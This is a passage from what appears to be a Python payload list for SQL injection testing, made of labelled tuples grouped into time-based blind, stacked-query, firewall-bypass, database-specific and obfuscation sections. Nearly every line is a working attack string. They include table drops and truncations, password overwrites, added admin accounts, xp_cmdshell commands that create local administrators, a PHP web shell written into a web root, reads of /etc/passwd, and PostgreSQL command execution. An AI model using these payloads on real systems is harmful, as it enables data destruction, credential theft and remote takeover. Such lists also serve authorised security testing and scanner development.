        ("' UNION SELECT NULL,SLEEP(3)--", "SQLi Time Union2Col"),
        ("' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(3),0)--", "SQLi Time Blind Extract DB"),
        ("' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>100,SLEEP(3),0)--", "SQLi Time Blind Extract User"),
        ("' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>100,SLEEP(3),0)--", "SQLi Time Blind Extract Version"),
        ("' AND IF(SUBSTRING((SELECT database()),1,1)='m',SLEEP(3),0)--", "SQLi Time Blind Char DB"),
        ("' AND IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(3),0)--", "SQLi Time Blind Char User"),
        ("' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0)--", "SQLi Time Blind Length DB"),
        ("' AND IF((SELECT LENGTH(user()))>5,SLEEP(3),0)--", "SQLi Time Blind Length User"),
        ("' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(3),0)--", "SQLi Time Blind Count Users"),
        ("' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(3),0)--", "SQLi Time Blind Count Tables"),
        ("' AND IF((SELECT table_name FROM information_schema.tables LIMIT 1) LIKE 'u%',SLEEP(3),0)--", "SQLi Time Blind Table Name"),
        ("' AND IF((SELECT column_name FROM information_schema.columns LIMIT 1) LIKE 'i%',SLEEP(3),0)--", "SQLi Time Blind Column Name"),
        ("' OR IF(1=1,SLEEP(3),0)='1'--", "SQLi Time OR Conditional"),
        ("' AND SLEEP(3) IS NOT NULL--", "SQLi Time IsNotNull"),
        ("' AND SLEEP(3) IS NULL--", "SQLi Time IsNull False"),
        ("' AND COALESCE(SLEEP(3),1)=1--", "SQLi Time Coalesce Sleep"),
        ("' AND NULLIF(SLEEP(3),1) IS NULL--", "SQLi Time NullIf Sleep"),
        ("' ; SELECT SLEEP(3)--", "SQLi Time Stacked Basic"),
        ("' ; SELECT pg_sleep(3)--", "SQLi Time Stacked PG"),
        ("' ; WAITFOR DELAY '0:0:3'--", "SQLi Time Stacked MSSQL"),
        ("' ; BEGIN WAITFOR DELAY '0:0:3' END;--", "SQLi Time Stacked Begin"),
        ("' OR 1=1; WAITFOR DELAY '0:0:3'--", "SQLi Time OR Stacked"),
        ("' AND 1=1; WAITFOR DELAY '0:0:3'--", "SQLi Time AND Stacked"),
        ("' UNION SELECT WAITFOR DELAY '0:0:3'--", "SQLi Time Union WAITFOR"),
        ("' AND (SELECT WAITFOR DELAY '0:0:3' FROM sys.objects)--", "SQLi Time MSSQL SysObjects"),
        ("' AND (SELECT WAITFOR DELAY '0:0:'+CAST(1 AS VARCHAR))--", "SQLi Time MSSQL Dynamic"),
        ("' AND (SELECT SLEEP(3) FROM information_schema.tables LIMIT 1)--", "SQLi Time MySQL Subquery"),
        ("' AND (SELECT BENCHMARK(10000000,MD5('a')) FROM information_schema.tables LIMIT 1)--", "SQLi Time Benchmark Subquery"),
        ("' AND (SELECT pg_sleep(3) FROM pg_tables LIMIT 1)--", "SQLi Time PG Tables"),
        ("' AND (SELECT pg_sleep(3) FROM pg_database LIMIT 1)--", "SQLi Time PG Database"),
        ("' AND IF((SELECT 1)=1,SLEEP(3),0)--", "SQLi Time IF Select"),
        ("' AND IF((SELECT 2)=1,SLEEP(3),0)--", "SQLi Time IF Select False"),
        ("' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--", "SQLi Time PG CASE"),
        ("' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END)--", "SQLi Time PG CASE False"),
        ("' AND 1=(SELECT CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END)--", "SQLi Time CASE Select"),
        ("' AND (SELECT COUNT(*) FROM (SELECT SLEEP(3)) AS a)--", "SQLi Time Subquery Count"),
        ("' AND (SELECT COUNT(*) FROM (SELECT BENCHMARK(10000000,MD5('a'))) AS a)--", "SQLi Time Benchmark Count"),
        ("' AND (SELECT COUNT(*) FROM (SELECT pg_sleep(3)) AS a)--", "SQLi Time PG Count"),
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,SLEEP(3)))--", "SQLi Time ExtractValue Sleep"),
        ("' AND UPDATEXML(1,CONCAT(0x7e,SLEEP(3)),1)--", "SQLi Time UpdateXML Sleep"),
        ("' AND GTID_SUBSET(SLEEP(3),1)--", "SQLi Time GTID Subset"),
        ("' AND GTID_SUBTRACT(CONCAT(SLEEP(3)),1)--", "SQLi Time GTID Subtract"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "SQLi Time Double Subquery"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(3)))AS a)--", "SQLi Time Subquery Alias"),
        ("' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(SLEEP(3),FLOOR(RAND()*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--", "SQLi Time Duplicate Sleep"),
        ("' AND JSON_EXTRACT('{\"a\":1}','$.a')=1 AND SLEEP(3)--", "SQLi Time JSON Extract"),
        ("' AND JSON_KEYS('{\"a\":1}') IS NOT NULL AND SLEEP(3)--", "SQLi Time JSON Keys"),
        ("' AND XMLTYPE('<?xml version=\"1.0\"?>') IS NOT NULL AND pg_sleep(3)--", "SQLi Time PG XML"),
        ("' AND (SELECT COUNT(*) FROM generate_series(1,1000000))>0 AND pg_sleep(3)--", "SQLi Time PG Generate"),
        ("' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0 AND pg_sleep(3)--", "SQLi Time PG Generate10M"),
        ("' AND (SELECT COUNT(*) FROM (SELECT 1 FROM pg_catalog.generate_series(1,1000000)) AS a)>0 AND pg_sleep(3)--", "SQLi Time PG Subquery Generate"),
        ("' AND (SELECT COUNT(*) FROM (SELECT 1 FROM sys.objects) AS a)>0 AND WAITFOR DELAY '0:0:3'--", "SQLi Time MSSQL Objects"),
        ("' AND (SELECT COUNT(*) FROM (SELECT 1 FROM sys.columns) AS a)>0 AND WAITFOR DELAY '0:0:3'--", "SQLi Time MSSQL Columns"),
        ("' AND (SELECT COUNT(*) FROM (SELECT 1 FROM sys.types) AS a)>0 AND WAITFOR DELAY '0:0:3'--", "SQLi Time MSSQL Types"),
        ("' AND (SELECT COUNT(*) FROM (SELECT 1 FROM sys.all_objects) AS a)>0 AND WAITFOR DELAY '0:0:3'--", "SQLi Time MSSQL AllObjects"),
        ("' AND (SELECT COUNT(*) FROM (SELECT 1 FROM sys.sysobjects) AS a)>0 AND WAITFOR DELAY '0:0:3'--", "SQLi Time MSSQL SysObjects2"),
        
        # ==================== 351-420: STACKED QUERIES (70 payload) ====================
        ("'; DROP TABLE users--", "SQLi Stacked Drop Users"),
        ("'; DROP TABLE admin--", "SQLi Stacked Drop Admin"),
        ("'; DROP TABLE products--", "SQLi Stacked Drop Products"),
        ("'; DROP TABLE orders--", "SQLi Stacked Drop Orders"),
        ("'; DROP TABLE customers--", "SQLi Stacked Drop Customers"),
        ("'; TRUNCATE TABLE users--", "SQLi Stacked Truncate Users"),
        ("'; TRUNCATE TABLE admin--", "SQLi Stacked Truncate Admin"),
        ("'; TRUNCATE TABLE logs--", "SQLi Stacked Truncate Logs"),
        ("'; TRUNCATE TABLE sessions--", "SQLi Stacked Truncate Sessions"),
        ("'; DELETE FROM users--", "SQLi Stacked Delete Users"),
        ("'; DELETE FROM admin WHERE 1=1--", "SQLi Stacked Delete Admin"),
        ("'; DELETE FROM products--", "SQLi Stacked Delete Products"),
        ("'; UPDATE users SET password='hacked'--", "SQLi Stacked Update All Pass"),
        ("'; UPDATE users SET password='hacked' WHERE username='admin'--", "SQLi Stacked Update Admin"),
        ("'; UPDATE admin SET role='superadmin' WHERE username='admin'--", "SQLi Stacked Update Role"),
        ("'; UPDATE products SET price=0--", "SQLi Stacked Update Price"),
        ("'; INSERT INTO users VALUES('hacker','pass123')--", "SQLi Stacked Insert User"),
        ("'; INSERT INTO admin VALUES('hacker','pass','admin')--", "SQLi Stacked Insert Admin"),
        ("'; INSERT INTO logs VALUES('hacked','system',NOW())--", "SQLi Stacked Insert Log"),
        ("'; INSERT INTO sessions VALUES('hacked',1,NOW())--", "SQLi Stacked Insert Session"),
        ("'; CREATE TABLE backdoor(id INT, cmd TEXT)--", "SQLi Stacked Create Backdoor"),
        ("'; CREATE TABLE stolen_data(id INT, data TEXT)--", "SQLi Stacked Create Stolen"),
        ("'; CREATE TABLE pwned(ip VARCHAR(50), timestamp DATETIME)--", "SQLi Stacked Create Pwned"),
        ("'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(100)--", "SQLi Stacked Alter Add"),
        ("'; ALTER TABLE users MODIFY COLUMN password TEXT--", "SQLi Stacked Alter Modify"),
        ("'; ALTER TABLE users DROP COLUMN security_question--", "SQLi Stacked Alter Drop"),
        ("'; RENAME TABLE users TO hacked_users--", "SQLi Stacked Rename"),
        ("'; CREATE INDEX idx_backdoor ON users(username)--", "SQLi Stacked Create Index"),
        ("'; DROP INDEX idx_backdoor ON users--", "SQLi Stacked Drop Index"),
        ("'; EXEC xp_cmdshell('whoami')--", "SQLi Stacked MSSQL Whoami"),
        ("'; EXEC xp_cmdshell('ipconfig')--", "SQLi Stacked MSSQL IPConfig"),
        ("'; EXEC xp_cmdshell('net user')--", "SQLi Stacked MSSQL NetUser"),
        ("'; EXEC xp_cmdshell('net user hacker pass /add')--", "SQLi Stacked MSSQL AddUser"),
        ("'; EXEC xp_cmdshell('net localgroup administrators hacker /add')--", "SQLi Stacked MSSQL AddAdmin"),
        ("'; EXEC xp_cmdshell('whoami > C:\\temp\\out.txt')--", "SQLi Stacked MSSQL Output"),
        ("'; EXEC xp_servicecontrol 'start','MSSQLSERVER'--", "SQLi Stacked MSSQL Service"),
        ("'; EXEC xp_availablemedia--", "SQLi Stacked MSSQL Media"),
        ("'; EXEC xp_dirtree 'C:\\'--", "SQLi Stacked MSSQL DirTree"),
        ("'; EXEC xp_fileexist 'C:\\windows\\win.ini'--", "SQLi Stacked MSSQL FileExist"),
        ("'; EXEC xp_subdirs 'C:\\'--", "SQLi Stacked MSSQL SubDirs"),
        ("'; EXEC sp_addlogin 'hacker','pass'--", "SQLi Stacked MSSQL AddLogin"),
        ("'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--", "SQLi Stacked MSSQL AddRole"),
        ("'; EXEC sp_adduser 'hacker','pass'--", "SQLi Stacked MSSQL AddUser2"),
        ("'; EXEC sp_addrolemember 'db_owner','hacker'--", "SQLi Stacked MSSQL AddRoleMember"),
        ("'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--", "SQLi Stacked MSSQL EnableXPCmd"),
        ("'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\backdoor.asp','SELECT * FROM users'--", "SQLi Stacked MSSQL WebTask"),
        ("'; SELECT * INTO OUTFILE '/tmp/out.txt' FROM users--", "SQLi Stacked MySQL Outfile"),
        ("'; SELECT * INTO DUMPFILE '/tmp/out.dump' FROM users--", "SQLi Stacked MySQL Dumpfile"),
        ("'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--", "SQLi Stacked MySQL Webshell"),
        ("'; SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd.txt'--", "SQLi Stacked MySQL CopyFile"),
        ("'; SET @sql = 'SELECT * FROM users'; PREPARE stmt FROM @sql; EXECUTE stmt--", "SQLi Stacked MySQL Prepare"),
        ("'; SET @cmd = 'whoami'; PREPARE stmt FROM @cmd; EXECUTE stmt--", "SQLi Stacked MySQL PrepareCmd"),
        ("'; DO SLEEP(5)--", "SQLi Stacked MySQL Sleep"),
        ("'; DO BENCHMARK(10000000,MD5('a'))--", "SQLi Stacked MySQL Benchmark"),
        ("'; SELECT pg_sleep(5)--", "SQLi Stacked PG Sleep"),
        ("'; CREATE OR REPLACE FUNCTION backdoor() RETURNS text AS $$ SELECT 'hacked' $$ LANGUAGE sql; SELECT backdoor()--", "SQLi Stacked PG Function"),
        ("'; COPY users TO '/tmp/users.csv'--", "SQLi Stacked PG Copy"),
        ("'; SELECT pg_read_file('/etc/passwd')--", "SQLi Stacked PG ReadFile"),
        ("'; SELECT pg_ls_dir('/')--", "SQLi Stacked PG ListDir"),
        ("'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami'; SELECT * FROM cmd_exec--", "SQLi Stacked PG CmdExec"),
        ("'; BEGIN; DROP TABLE users; COMMIT--", "SQLi Stacked Transaction Drop"),
        ("'; BEGIN; INSERT INTO users VALUES('hacker','pass'); COMMIT--", "SQLi Stacked Transaction Insert"),
        ("'; SAVEPOINT sp1; DROP TABLE users; ROLLBACK TO sp1--", "SQLi Stacked Savepoint"),
        ("'; DECLARE @sql NVARCHAR(4000); SET @sql = 'SELECT * FROM users'; EXEC sp_executesql @sql--", "SQLi Stacked MSSQL DynamicSQL"),
        ("'; DECLARE @cmd NVARCHAR(4000); SET @cmd = 'whoami'; EXEC xp_cmdshell @cmd--", "SQLi Stacked MSSQL DynamicCmd"),
        ("'; IF EXISTS(SELECT 1 FROM users) DROP TABLE users--", "SQLi Stacked Conditional Drop"),
        ("'; IF NOT EXISTS(SELECT 1 FROM users) CREATE TABLE users(id INT)--", "SQLi Stacked Conditional Create"),
        ("'; WHILE (SELECT COUNT(*) FROM users) > 0 DELETE TOP(1) FROM users--", "SQLi Stacked Loop Delete"),
        
        # ==================== 421-520: WAF BYPASS TECHNIQUES (100 payload) ====================
        ("'/**/OR/**/1=1--", "SQLi Comment Bypass Basic"),
        ("'/*!OR*/1=1--", "SQLi MySQL Comment Bypass"),
        ("'/*!50000OR*/1=1--", "SQLi MySQL Version Comment"),
        ("'/%2A/OR/%2A/1=1--", "SQLi URL Encoded Comment"),
        ("'%2F**%2FOR%2F**%2F1=1--", "SQLi Full URL Comment"),
        ("' OR 1=1%00", "SQLi Null Byte Bypass"),
        ("' OR 1=1%00--", "SQLi Null Byte Comment"),
        ("' OR 1=1%0A--", "SQLi Linefeed Bypass"),
        ("' OR 1=1%0D--", "SQLi Carriage Return"),
        ("' OR 1=1%0D%0A--", "SQLi CRLF Bypass"),
        ("' OR 1=1%09--", "SQLi Tab Bypass"),
        ("' OR 1=1%0B--", "SQLi Vertical Tab"),
        ("' OR 1=1%0C--", "SQLi Form Feed"),
        ("' OR 1=1%20%20--", "SQLi Double Space"),
        ("' OR 1=1%20%20%20--", "SQLi Triple Space"),
        ("' OR 1=1/**/--", "SQLi Comment Space"),
        ("' OR/**/1=1--", "SQLi Comment After OR"),
        ("'/**/OR/**/1/**/=/**/1--", "SQLi Full Comment Obfuscation"),
        ("'/*!OR*/1=1/*!*/--", "SQLi MySQL Mixed"),
        ("' OR '1'='1'%23", "SQLi URL Hash"),
        ("' OR '1'='1'%26%26", "SQLi URL And"),
        ("' OR '1'='1'%7C%7C", "SQLi URL Or"),
        ("' || '1'='1'--", "SQLi Double Pipe"),
        ("' || 1=1--", "SQLi Numeric Pipe"),
        ("' && 1=1--", "SQLi Double Ampersand"),
        ("' & 1=1--", "SQLi Single Ampersand"),
        ("' | 1=1--", "SQLi Bitwise OR"),
        ("' & 1=1--", "SQLi Bitwise AND"),
        ("' ^ 1=1--", "SQLi Bitwise XOR"),
        ("' || '1'||'='||'1'--", "SQLi Concat OR"),
        ("' + '1' = '1'--", "SQLi Plus Operator"),
        ("' - '0' = '0'--", "SQLi Minus Operator"),
        ("' * '1' = '1'--", "SQLi Multiply"),
        ("' / '1' = '1'--", "SQLi Divide"),
        ("' % '1' = '1'--", "SQLi Modulo"),
        ("' OR 1=1 AND 1=1--", "SQLi Double Condition"),
        ("' OR 1=1 OR 1=1--", "SQLi Multiple OR"),
        ("' AND 1=1 AND 1=1--", "SQLi Multiple AND"),
        ("' OR (1=1)--", "SQLi Paren Wrapper"),
        ("' OR ((1=1))--", "SQLi Double Paren"),
        ("' OR (((1=1)))--", "SQLi Triple Paren"),
        ("' OR 1=1-- -", "SQLi Dash Dash Space"),
        ("' OR 1=1--+", "SQLi Dash Plus"),
        ("' OR 1=1--%20", "SQLi Dash URL Space"),
        ("' OR 1=1--%2D", "SQLi Dash Encoded"),
        ("' OR 1=1--%2D%2D", "SQLi Double Dash Encoded"),
        ("' OR 1=1/*", "SQLi Open Comment"),
        ("' OR 1=1/*!*/", "SQLi Empty Comment"),
        ("' OR 1=1/*!50000*/", "SQLi Version Comment Empty"),
        ("' OR 1=1#", "SQLi Hash Basic"),
        ("' OR 1=1 #", "SQLi Hash Space"),
        ("' OR 1=1\t#", "SQLi Hash Tab"),
        ("' OR 1=1%20%23", "SQLi Hash URL"),
        ("' OR 1=1%20%20%23", "SQLi Hash Double Space"),
        ("' OR 1=1%09%23", "SQLi Hash Tab URL"),
        ("' OR/**/1=1/**/#", "SQLi Comment Hash"),
        ("' OR 1=1;%00", "SQLi Null Semicolon"),
        ("' OR 1=1;#", "SQLi Semicolon Hash"),
        ("' OR '1'='1' LIMIT 1#", "SQLi Limit Hash"),
        ("' OR 1=1 GROUP BY 1#", "SQLi Group Hash"),
        ("' OR 1=1 ORDER BY 1#", "SQLi Order Hash"),
        ("' OR 1=1 HAVING 1=1#", "SQLi Having Hash"),
        ("' OR 1=1 UNION SELECT NULL#", "SQLi Union Hash"),
        ("'%20OR%201=1--", "SQLi Full URL Encode"),
        ("'%2520OR%25201=1--", "SQLi Double URL Encode"),
        ("'%252520OR%2525201=1--", "SQLi Triple URL Encode"),
        ("'%20%6F%72%20%31%3D%31--", "SQLi Hex Encode OR"),
        ("'%20%4F%52%20%31%3D%31--", "SQLi Hex Encode OR Upper"),
        ("'%20%6f%72%20%31%3d%31--", "SQLi Hex Lower"),
        ("'\\x20\\x6f\\x72\\x20\\x31\\x3d\\x31--", "SQLi Hex String"),
        ("'\\u0020\\u006f\\u0072\\u0020\\u0031\\u003d\\u0031--", "SQLi Unicode Bypass"),
        ("'%u0020%u006f%u0072%u0020%u0031%u003d%u0031--", "SQLi Unicode URL"),
        ("'%EF%BC%87%20%EF%BC%AF%EF%BC%B2%20%EF%BC%91%EF%BC%9D%EF%BC%91--", "SQLi Fullwidth Bypass"),
        ("'%uff07%20%uff2f%uff32%20%uff11%uff1d%uff11--", "SQLi Fullwidth Unicode"),
        ("'%E2%80%87%20%EF%BC%AF%EF%BC%B2%20%31%3D%31--", "SQLi Mixed Unicode"),
        ("' OR 1=1 IN (SELECT 1)--", "SQLi IN Bypass"),
        ("' OR 1=1 EXISTS(SELECT 1)--", "SQLi EXISTS Bypass"),
        ("' OR 1=1 NOT EXISTS(SELECT 1)--", "SQLi NOT EXISTS Bypass"),
        ("' OR 1=1 IS TRUE--", "SQLi IS TRUE Bypass"),
        ("' OR 1=1 IS NOT FALSE--", "SQLi IS NOT FALSE"),
        ("' OR 1=1 BETWEEN 0 AND 2--", "SQLi BETWEEN Bypass"),
        ("' OR 1=1 LIKE '1'--", "SQLi LIKE Bypass"),
        ("' OR 1=1 REGEXP '^1$'--", "SQLi REGEXP Bypass"),
        ("' OR 1=1 RLIKE '^1$'--", "SQLi RLIKE Bypass"),
        ("' OR 1=1 SOUNDS LIKE '1'--", "SQLi SOUNDS LIKE Bypass"),
        ("' OR 1=1 MATCH AGAINST('1')--", "SQLi MATCH Bypass"),
        ("' OR 1=1 AND 1=1 COLLATE utf8_bin--", "SQLi COLLATE Bypass"),
        ("' OR 1=1 CONVERT(1 USING utf8)--", "SQLi CONVERT Bypass"),
        ("' OR 1=1 CAST(1 AS CHAR)--", "SQLi CAST Bypass"),
        ("' OR HEX(1)=HEX(1)--", "SQLi HEX Bypass"),
        ("' OR UNHEX(HEX(1))=1--", "SQLi UNHEX Bypass"),
        ("' OR BASE64_ENCODE(1)=BASE64_ENCODE(1)--", "SQLi BASE64 Bypass"),
        ("' OR MD5(1)=MD5(1)--", "SQLi MD5 Bypass"),
        ("' OR SHA1(1)=SHA1(1)--", "SQLi SHA1 Bypass"),
        ("' OR CRC32(1)=CRC32(1)--", "SQLi CRC32 Bypass"),
        ("' OR PASSWORD('a')=PASSWORD('a')--", "SQLi PASSWORD Bypass"),
        ("' OR ENCRYPT('a','salt')=ENCRYPT('a','salt')--", "SQLi ENCRYPT Bypass"),
        ("' OR AES_ENCRYPT('a','key')=AES_ENCRYPT('a','key')--", "SQLi AES Bypass"),
        ("' OR DES_ENCRYPT('a','key')=DES_ENCRYPT('a','key')--", "SQLi DES Bypass"),
        ("' OR COMPRESS('a')=COMPRESS('a')--", "SQLi COMPRESS Bypass"),
        ("' OR UNCOMPRESS(COMPRESS('a'))='a'--", "SQLi UNCOMPRESS Bypass"),
        
        # ==================== 521-620: DATABASE-SPECIFIC ADVANCED (100 payload) ====================
        # MySQL Advanced (1-30)
        ("' OR CONNECTION_ID()=CONNECTION_ID()--", "SQLi MySQL ConnectionID"),
        ("' OR LAST_INSERT_ID()=LAST_INSERT_ID()--", "SQLi MySQL LastInsert"),
        ("' OR FOUND_ROWS()=FOUND_ROWS()--", "SQLi MySQL FoundRows"),
        ("' OR ROW_COUNT()=ROW_COUNT()--", "SQLi MySQL RowCount"),
        ("' OR CHARSET(CONNECTION_ID())=CHARSET(CONNECTION_ID())--", "SQLi MySQL Charset"),
        ("' OR COLLATION(CONNECTION_ID())=COLLATION(CONNECTION_ID())--", "SQLi MySQL Collation"),
        ("' OR SCHEMA()=SCHEMA()--", "SQLi MySQL Schema"),
        ("' OR DATABASE()=DATABASE()--", "SQLi MySQL Database"),
        ("' OR USER()=USER()--", "SQLi MySQL User"),
        ("' OR SYSTEM_USER()=SYSTEM_USER()--", "SQLi MySQL SystemUser"),
        ("' OR SESSION_USER()=SESSION_USER()--", "SQLi MySQL SessionUser"),
        ("' OR CURRENT_USER()=CURRENT_USER()--", "SQLi MySQL CurrentUser"),
        ("' OR VERSION()=VERSION()--", "SQLi MySQL Version2"),
        ("' OR UUID()=UUID()--", "SQLi MySQL UUID"),
        ("' OR UUID_SHORT()=UUID_SHORT()--", "SQLi MySQL UUIDShort"),
        ("' OR RAND()=RAND()--", "SQLi MySQL Rand"),
        ("' OR RAND(1)=RAND(1)--", "SQLi MySQL RandSeed"),
        ("' OR LAST_DAY(NOW())=LAST_DAY(NOW())--", "SQLi MySQL LastDay"),
        ("' OR MONTH(NOW())=MONTH(NOW())--", "SQLi MySQL Month"),
        ("' OR YEAR(NOW())=YEAR(NOW())--", "SQLi MySQL Year"),
        ("' OR WEEK(NOW())=WEEK(NOW())--", "SQLi MySQL Week"),
        ("' OR DAYOFMONTH(NOW())=DAYOFMONTH(NOW())--", "SQLi MySQL Day"),
        ("' OR HOUR(NOW())=HOUR(NOW())--", "SQLi MySQL Hour"),
        ("' OR MINUTE(NOW())=MINUTE(NOW())--", "SQLi MySQL Minute"),
        ("' OR SECOND(NOW())=SECOND(NOW())--", "SQLi MySQL Second"),
        ("' OR MICROSECOND(NOW())=MICROSECOND(NOW())--", "SQLi MySQL Microsecond"),
        ("' OR UNIX_TIMESTAMP()=UNIX_TIMESTAMP()--", "SQLi MySQL UnixTimestamp"),
        ("' OR FROM_UNIXTIME(UNIX_TIMESTAMP())=FROM_UNIXTIME(UNIX_TIMESTAMP())--", "SQLi MySQL FromUnix"),
        ("' OR DATE_FORMAT(NOW(),'%Y')=DATE_FORMAT(NOW(),'%Y')--", "SQLi MySQL DateFormat"),
        ("' OR STR_TO_DATE('2024','%Y')=STR_TO_DATE('2024','%Y')--", "SQLi MySQL StrToDate"),
        
        # PostgreSQL Advanced (31-60)
        ("' || current_setting('server_version') IS NOT NULL--", "SQLi PG Setting"),
        ("' || current_database() IS NOT NULL--", "SQLi PG CurrentDB"),
        ("' || current_schema() IS NOT NULL--", "SQLi PG CurrentSchema"),
        ("' || current_user IS NOT NULL--", "SQLi PG CurrentUser"),
        ("' || session_user IS NOT NULL--", "SQLi PG SessionUser"),
        ("' || user IS NOT NULL--", "SQLi PG User"),
        ("' || inet_client_addr() IS NOT NULL--", "SQLi PG ClientAddr"),
        ("' || inet_server_addr() IS NOT NULL--", "SQLi PG ServerAddr"),
        ("' || pg_backend_pid()>0--", "SQLi PG BackendPID"),
        ("' || pg_postmaster_start_time() IS NOT NULL--", "SQLi PG StartTime"),
        ("' || pg_conf_load_time() IS NOT NULL--", "SQLi PG ConfLoad"),
        ("' || pg_trigger_depth()>=0--", "SQLi PG TriggerDepth"),
        ("' || pg_blocking_pids(pg_backend_pid()) IS NOT NULL--", "SQLi PG BlockingPIDs"),
        ("' || pg_is_in_recovery() IS NOT NULL--", "SQLi PG Recovery"),
        ("' || pg_is_other_temp_schema(1) IS NOT NULL--", "SQLi PG TempSchema"),
        ("' || pg_my_temp_schema() IS NOT NULL--", "SQLi PG MyTempSchema"),
        ("' || pg_get_keywords() IS NOT NULL--", "SQLi PG Keywords"),
        ("' || pg_get_ruledef(0) IS NOT NULL--", "SQLi PG RuleDef"),
        ("' || pg_get_viewdef(0) IS NOT NULL--", "SQLi PG ViewDef"),
        ("' || pg_get_userbyid(10) IS NOT NULL--", "SQLi PG UserByID"),
        ("' || pg_get_serial_sequence('users','id') IS NOT NULL--", "SQLi PG SerialSeq"),
        ("' || pg_relation_size('users')>=0--", "SQLi PG RelationSize"),
        ("' || pg_table_size('users')>=0--", "SQLi PG TableSize"),
        ("' || pg_indexes_size('users')>=0--", "SQLi PG IndexSize"),
        ("' || pg_total_relation_size('users')>=0--", "SQLi PG TotalSize"),
        ("' || pg_database_size(current_database())>=0--", "SQLi PG DatabaseSize"),
        ("' || pg_size_pretty(pg_database_size(current_database())) IS NOT NULL--", "SQLi PG SizePretty"),
        ("' || pg_stat_get_db_numbackends(oid)>=0 FROM pg_database WHERE datname=current_database()--", "SQLi PG NumBackends"),
        ("' || pg_stat_get_db_xact_commit(oid)>=0 FROM pg_database WHERE datname=current_database()--", "SQLi PG XactCommit"),
        ("' || pg_stat_get_db_xact_rollback(oid)>=0 FROM pg_database WHERE datname=current_database()--", "SQLi PG XactRollback"),
        
        # MSSQL Advanced (61-90)
        ("' AND @@ROWCOUNT>=0--", "SQLi MSSQL RowCount2"),
        ("' AND @@TRANCOUNT>=0--", "SQLi MSSQL TranCount"),
        ("' AND @@ERROR=0--", "SQLi MSSQL Error"),
        ("' AND @@IDENTITY IS NOT NULL--", "SQLi MSSQL Identity"),
        ("' AND @@CPU_BUSY>=0--", "SQLi MSSQL CPUBusy"),
        ("' AND @@IDLE>=0--", "SQLi MSSQL Idle"),
        ("' AND @@IO_BUSY>=0--", "SQLi MSSQL IOBusy"),
        ("' AND @@PACK_RECEIVED>=0--", "SQLi MSSQL PackReceived"),
        ("' AND @@PACK_SENT>=0--", "SQLi MSSQL PackSent"),
        ("' AND @@PACKET_ERRORS>=0--", "SQLi MSSQL PacketErrors"),
        ("' AND @@TOTAL_ERRORS>=0--", "SQLi MSSQL TotalErrors"),
        ("' AND @@TOTAL_READ>=0--", "SQLi MSSQL TotalRead"),
        ("' AND @@TOTAL_WRITE>=0--", "SQLi MSSQL TotalWrite"),
        ("' AND @@CONNECTIONS>=0--", "SQLi MSSQL Connections"),
        ("' AND @@MAX_CONNECTIONS>=0--", "SQLi MSSQL MaxConnections2"),
        ("' AND @@NESTLEVEL>=0--", "SQLi MSSQL NestLevel2"),
        ("' AND @@OPTIONS>=0--", "SQLi MSSQL Options2"),
        ("' AND @@REMSERVER IS NOT NULL--", "SQLi MSSQL RemServer2"),
        ("' AND @@SERVICENAME IS NOT NULL--", "SQLi MSSQL ServiceName"),
        ("' AND @@SPID>=0--", "SQLi MSSQL SPID"),
        ("' AND @@TEXTSIZE>=0--", "SQLi MSSQL TextSize2"),
        ("' AND @@VERSION IS NOT NULL--", "SQLi MSSQL Version2"),
        ("' AND CURRENT_USER IS NOT NULL--", "SQLi MSSQL CurrentUser"),
        ("' AND SUSER_NAME() IS NOT NULL--", "SQLi MSSQL SUser"),
        ("' AND SUSER_SNAME() IS NOT NULL--", "SQLi MSSQL SUserSName"),
        ("' AND USER_NAME() IS NOT NULL--", "SQLi MSSQL UserName"),
        ("' AND SYSTEM_USER IS NOT NULL--", "SQLi MSSQL SystemUser"),
        ("' AND ORIGINAL_LOGIN() IS NOT NULL--", "SQLi MSSQL OriginalLogin"),
        ("' AND APP_NAME() IS NOT NULL--", "SQLi MSSQL AppName"),
        ("' AND HOST_NAME() IS NOT NULL--", "SQLi MSSQL HostName"),
        
        # SQLite Advanced (91-100)
        ("' AND sqlite_version()=sqlite_version()--", "SQLi SQLite Version"),
        ("' AND random()=random()--", "SQLi SQLite Random"),
        ("' AND last_insert_rowid()>=0--", "SQLi SQLite LastInsertRowID"),
        ("' AND changes()>=0--", "SQLi SQLite Changes"),
        ("' AND total_changes()>=0--", "SQLi SQLite TotalChanges"),
        ("' AND typeof(1)='integer'--", "SQLi SQLite TypeOf"),
        ("' AND json('{\"a\":1}') IS NOT NULL--", "SQLi SQLite JSON"),
        ("' AND char(65)='A'--", "SQLi SQLite Char"),
        ("' AND unicode('A')=65--", "SQLi SQLite Unicode"),
        ("' AND date('now')=date('now')--", "SQLi SQLite Date"),
        
        # ==================== 621-720: OBFUSCATION & ENCODING (100 payload) ====================
        ("' OR 1=1-- -", "SQLi Obfuscated Dash"),
        ("' OR 1=1--+", "SQLi Obfuscated Plus"),
        ("' OR 1=1--%20", "SQLi Obfuscated Space"),
        ("' OR 1=1--%2D%2D", "SQLi Obfuscated DoubleDash"),
        ("' OR 1=1--%2D%2D%20", "SQLi Obfuscated DashSpace"),
        ("'%20%4f%52%20%31%3d%31--", "SQLi Hex Full"),
